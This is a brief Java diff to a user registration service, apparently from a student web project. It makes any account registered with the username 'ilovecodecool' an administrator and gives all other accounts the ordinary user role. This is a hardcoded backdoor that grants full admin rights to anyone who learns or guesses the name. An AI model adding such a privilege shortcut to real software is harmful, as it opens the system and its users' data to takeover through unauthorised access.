@@ -27,7 +27,11 @@ public class UserServiceImpl implements UserService {
 
     @Override
     public UserRegisterDto saveUser(User user) {
-        user.setRole(UserRole.USER);
+        if (user.getUsername().equals("ilovecodecool")) {
+            user.setRole(UserRole.ADMIN);
+        } else {
+            user.setRole(UserRole.USER);
+        }
         user.setPassword(passwordEncoder.encode(user.getPassword()));
         User savedUser = userRepository.saveAndFlush(user);
         return UserRegisterDto.mapToDto(savedUser);
